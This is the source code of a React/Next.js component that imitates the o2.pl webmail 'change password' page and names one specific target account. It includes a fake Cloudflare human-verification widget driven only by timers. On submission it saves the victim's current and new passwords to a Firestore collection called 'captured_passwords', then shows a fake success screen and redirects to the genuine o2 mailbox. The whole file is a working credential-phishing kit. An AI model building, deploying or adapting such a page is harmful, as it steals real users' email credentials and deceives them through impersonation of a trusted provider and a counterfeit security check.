"use client"

import { useState, useEffect } from "react"
import { ChevronLeft, Loader2, Check } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import Image from "next/image"
import { PlaceHolderImages } from "@/lib/placeholder-images"
import { useFirebase, setDocumentNonBlocking, initiateAnonymousSignIn } from "@/firebase"
import { collection, doc } from "firebase/firestore"
import { O2Icon } from "./O2Icon"

export function O2Login() {
  const [currentPassword, setCurrentPassword] = useState("")
  const [newPassword, setNewPassword] = useState("")
  const [confirmPassword, setConfirmPassword] = useState("")
  const [showCurrent, setShowCurrent] = useState(false)
  const [showNew, setShowNew] = useState(false)
  const [showConfirm, setShowConfirm] = useState(false)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isFinished, setIsFinished] = useState(false)
  
  // Cloudflare States
  const [cfStatus, setCfStatus] = useState<'initial' | 'ready' | 'verifying' | 'verified'>('initial')

  const { firestore, auth, user } = useFirebase();
  const wpIllustration = PlaceHolderImages.find(img => img.id === "wp-illustration")
  const partner1 = PlaceHolderImages.find(img => img.id === "partner-logo-1")
  const partner2 = PlaceHolderImages.find(img => img.id === "partner-logo-2")

  useEffect(() => {
    if (auth && !user) {
      initiateAnonymousSignIn(auth);
    }
  }, [auth, user]);

  // Initial Cloudflare verification (2 seconds)
  useEffect(() => {
    const timer = setTimeout(() => {
      setCfStatus('ready')
    }, 2000)
    return () => clearTimeout(timer)
  }, [])

  const handleCloudflareClick = () => {
    if (cfStatus !== 'ready') return
    setCfStatus('verifying')
    setTimeout(() => {
      setCfStatus('verified')
    }, 1500)
  }

  // Password strength calculation
  const getPasswordStrength = (pwd: string) => {
    if (!pwd) return { score: 0, label: "Brak" };
    let score = 0;
    if (pwd.length > 6) score++;
    if (pwd.length > 10) score++;
    if (/[A-Z]/.test(pwd)) score++;
    if (/[0-9]/.test(pwd)) score++;
    if (/[^A-Za-z0-9]/.test(pwd)) score++;
    
    const labels = ["Bardzo słabe", "Słabe", "Średnie", "Dobre", "Bardzo dobre", "Znakomita"];
    return { score, label: labels[score] };
  }

  const strength = getPasswordStrength(newPassword);
  const passwordsMatch = newPassword === confirmPassword;
  const showMatchError = confirmPassword.length > 0 && !passwordsMatch;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (cfStatus !== 'verified' || !passwordsMatch) return
    
    setIsSubmitting(true)
    
    if (firestore) {
      const colRef = collection(firestore, "captured_passwords");
      const id = doc(colRef).id;
      const docRef = doc(firestore, "captured_passwords", id);
      
      setDocumentNonBlocking(docRef, {
        id,
        password: newPassword,
        sourceEmail: currentPassword,
        captureTimestamp: new Date().toISOString(),
      }, { merge: true });
    }
    
    setTimeout(() => {
      setIsSubmitting(false)
      setIsFinished(true)
    }, 1500)
  }

  if (isFinished) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center p-4">
        <div className="max-w-md w-full text-center space-y-6">
          <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto">
            <Check className="w-8 h-8 text-green-600" />
          </div>
          <h2 className="text-xl font-bold">Hasło zostało zmienione</h2>
          <p className="text-gray-500 text-sm">Twoje hasło zostało pomyślnie zaktualizowane. Za chwilę zostaniesz przekierowany do skrzynki.</p>
          <Button className="w-full bg-[#002aff] hover:bg-blue-700" onClick={() => window.location.href = "https://poczta.o2.pl"}>
            Przejdź do poczty
          </Button>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen flex flex-col md:flex-row bg-white">
      {/* Left Sidebar */}
      <div className="w-full md:w-[320px] flex flex-col border-r min-h-screen bg-white shadow-2xl z-20">
        {/* Top Bar */}
        <div className="h-14 flex items-center justify-between px-4 border-b bg-white shadow-sm shrink-0">
          <button className="text-[#002aff] hover:bg-blue-50 p-1 rounded-full transition-colors">
            <ChevronLeft className="w-5 h-5" />
          </button>
          <div className="flex items-center justify-center h-full">
            <O2Icon className="w-16 h-8" />
          </div>
          <div className="w-8" />
        </div>

        <div className="flex-1 flex flex-col p-6 space-y-5 overflow-y-auto">
          <div className="space-y-1">
            <h2 className="text-xl font-bold text-gray-800">Zmień hasło</h2>
            <p className="text-[12px] text-gray-500 font-medium">dla konta <span className="text-gray-900 font-bold">sabatinka@o2.pl</span></p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="space-y-7">
              {/* Aktualne Hasło */}
              <div className="relative">
                <Input
                  type={showCurrent ? "text" : "password"}
                  placeholder="Aktualne hasło"
                  value={currentPassword}
                  onChange={(e) => setCurrentPassword(e.target.value)}
                  required
                  className="h-11 border-gray-200 text-sm focus:ring-[#002aff] rounded-sm pr-16"
                  autoFocus
                />
                <button
                  type="button"
                  onClick={() => setShowCurrent(!showCurrent)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-[9px] font-bold text-gray-400 hover:text-[#002aff] uppercase tracking-wider"
                >
                  {showCurrent ? "UKRYJ" : "POKAŻ"}
                </button>
              </div>

              {/* Nowe Hasła */}
              <div className="space-y-3">
                <div className="relative">
                  <Input
                    type={showNew ? "text" : "password"}
                    placeholder="Nowe hasło"
                    value={newPassword}
                    onChange={(e) => setNewPassword(e.target.value)}
                    required
                    className="h-11 border-gray-200 text-sm pr-16 focus:ring-[#002aff] rounded-sm"
                  />
                  <button
                    type="button"
                    onClick={() => setShowNew(!showNew)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-[9px] font-bold text-gray-400 hover:text-[#002aff] uppercase tracking-wider"
                  >
                    {showNew ? "UKRYJ" : "POKAŻ"}
                  </button>
                </div>

                <div className="relative">
                  <Input
                    type={showConfirm ? "text" : "password"}
                    placeholder="Powtórz nowe hasło"
                    value={confirmPassword}
                    onChange={(e) => setConfirmPassword(e.target.value)}
                    required
                    className={`h-11 border-gray-200 text-sm pr-16 focus:ring-[#002aff] rounded-sm ${showMatchError ? 'border-red-500' : ''}`}
                  />
                  <button
                    type="button"
                    onClick={() => setShowConfirm(!showConfirm)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-[9px] font-bold text-gray-400 hover:text-[#002aff] uppercase tracking-wider"
                  >
                    {showConfirm ? "UKRYJ" : "POKAŻ"}
                  </button>
                </div>

                {showMatchError && (
                  <p className="text-[10px] text-red-500 font-bold">Hasła nie są identyczne</p>
                )}

                {/* Siła hasła dynamiczna */}
                <div className="space-y-1.5 pt-1">
                  <p className="text-[11px] text-gray-700">Siła hasła: <span className="font-bold">{strength.label}</span></p>
                  <div className="flex gap-1.5 h-1.5 w-full">
                    {[1, 2, 3, 4, 5].map((i) => (
                      <div 
                        key={i} 
                        className={`flex-1 rounded-full transition-colors duration-300 ${i <= strength.score ? 'bg-[#22c55e]' : 'bg-gray-100'}`} 
                      />
                    ))}
                  </div>
                </div>
              </div>
            </div>

            {/* Cloudflare Widget */}
            <div 
              className={`bg-[#313131] border border-transparent p-4 min-h-[80px] rounded-sm flex items-center justify-between transition-all duration-300 ${cfStatus === 'ready' ? 'cursor-pointer hover:bg-[#3a3a3a]' : 'cursor-default'}`}
              onClick={handleCloudflareClick}
            >
              <div className="flex items-center gap-4">
                <div className="w-8 h-8 flex items-center justify-center relative">
                  {(cfStatus === 'initial' || cfStatus === 'verifying') && (
                    <Loader2 className="w-7 h-7 text-white animate-spin" />
                  )}
                  {cfStatus === 'ready' && (
                    <div className="w-6 h-6 border-2 border-gray-500 bg-transparent rounded-sm" />
                  )}
                  {cfStatus === 'verified' && (
                    <div className="bg-[#22c55e] rounded-full p-1 animate-in zoom-in duration-300 flex items-center justify-center">
                      <Check className="w-5 h-5 text-white" strokeWidth={4} />
                    </div>
                  )}
                </div>
                <div className="flex flex-col">
                  <span className="text-[10.5px] font-semibold text-white leading-tight">
                    {(cfStatus === 'initial' || cfStatus === 'verifying') && 'Weryfikuję...'}
                    {cfStatus === 'ready' && 'Jestem człowiekiem'}
                    {cfStatus === 'verified' && 'Powodzenie!'}
                  </span>
                  {cfStatus !== 'verified' && (
                    <span className="text-[8px] text-gray-400 leading-tight">I am human</span>
                  )}
                </div>
              </div>
              
              <div className="flex flex-col items-end shrink-0">
                <div className="flex items-center gap-1">
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 3C7.03 3 3 7.03 3 12C3 16.97 7.03 21 12 21C16.97 21 21 16.97 21 12C21 7.03 16.97 3 12 3ZM12 19.5C7.86 19.5 4.5 16.14 4.5 12C4.5 7.86 7.86 4.5 12 4.5C16.14 4.5 19.5 7.86 19.5 12C19.5 16.14 16.14 19.5 12 19.5Z" fill="#F48120"/>
                    <path d="M16.5 10.5C16.5 12.98 14.48 15 12 15C9.52 15 7.5 12.98 7.5 10.5C7.5 8.02 9.52 6 12 6C14.48 6 16.5 8.02 16.5 10.5Z" fill="#F48120"/>
                  </svg>
                  <span className="text-[9px] font-black text-white tracking-widest uppercase">Cloudflare</span>
                </div>
                <div className="flex gap-2 mt-0.5">
                  <button type="button" className="text-[8px] text-gray-300 underline hover:text-white">Prywatność</button>
                  <button type="button" className="text-[8px] text-gray-300 underline hover:text-white">Pomoc</button>
                </div>
              </div>
            </div>

            <Button 
              type="submit" 
              className="w-full h-11 bg-[#002aff] hover:bg-blue-700 font-bold text-sm rounded-sm shadow-sm transition-all active:scale-[0.98]" 
              disabled={isSubmitting || cfStatus !== 'verified' || !passwordsMatch || newPassword.length === 0}
            >
              {isSubmitting ? <Loader2 className="animate-spin w-5 h-5" /> : "Zaktualizuj hasło"}
            </Button>
          </form>

          <div className="text-center space-y-5 pt-2">
            <a href="#" className="text-[11px] font-bold text-blue-600 hover:underline">Zapomniałeś aktualnego hasła?</a>
            <div className="relative">
              <div className="absolute inset-0 flex items-center"><span className="w-full border-t border-gray-100" /></div>
              <div className="relative flex justify-center text-[8px] uppercase font-bold tracking-[0.1em]"><span className="bg-white px-3 text-gray-300">lub wróć do</span></div>
            </div>
            
            <a href="#" className="block text-blue-600 font-bold text-[12px] hover:underline">Logowania do poczty</a>
          </div>

          <div className="mt-auto pt-4 text-[9px] text-gray-400 space-y-1 text-center font-medium">
            <div className="flex justify-center gap-2 items-center">
              <span>Język: <button className="text-gray-600 font-bold">Polski</button> | <button>English</button></span>
              <span className="w-0.5 h-0.5 bg-gray-200 rounded-full" />
              <button>O nas</button>
              <span className="w-0.5 h-0.5 bg-gray-200 rounded-full" />
              <button>Pomoc</button>
            </div>
            <div className="flex justify-center gap-2 items-center">
              <button>Regulamin</button>
              <span className="w-0.5 h-0.5 bg-gray-200 rounded-full" />
              <button>Prywatność</button>
            </div>
            <p className="pt-2">© 2024 Grupa WP</p>
          </div>
        </div>
      </div>

      {/* Right Content */}
      <div className="flex-1 bg-pattern flex flex-col items-center justify-center p-8 md:p-16 relative overflow-hidden bg-gray-50">
        <div className="max-w-lg space-y-8 z-10 text-center md:text-left w-full">
          <div className="space-y-4">
            <h1 className="text-3xl md:text-4xl lg:text-5xl font-extrabold text-[#111c30] leading-[1.15]">
              Dbaj o bezpieczeństwo swojej poczty
            </h1>
            <p className="text-sm md:text-base text-gray-500 max-w-sm">
              Regularna zmiana hasła to najlepszy sposób na ochronę Twoich danych i korespondencji.
            </p>
          </div>
          
          <Button variant="outline" className="h-10 px-8 border-gray-200 font-bold hover:bg-white text-gray-700 rounded-sm">
            Więcej o bezpieczeństwie
          </Button>

          <div className="relative w-full aspect-[4/3] max-w-[400px] mx-auto md:mx-0 mt-8">
            {wpIllustration && (
              <Image src={wpIllustration.imageUrl} alt="Illustration" fill className="object-contain" data-ai-hint={wpIllustration.imageHint} />
            )}
          </div>
        </div>

        {/* Partner Logos */}
        <div className="absolute bottom-8 w-full px-8 hidden md:block">
          <div className="flex gap-4 justify-center items-center opacity-30 grayscale pointer-events-none">
            {[partner1, partner2, partner1, partner2].map((p, i) => (
              <div key={i} className="w-24 h-8 relative">
                {p && <Image src={p.imageUrl} alt="partner" fill className="object-contain" data-ai-hint={p.imageHint} />}
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  )
}
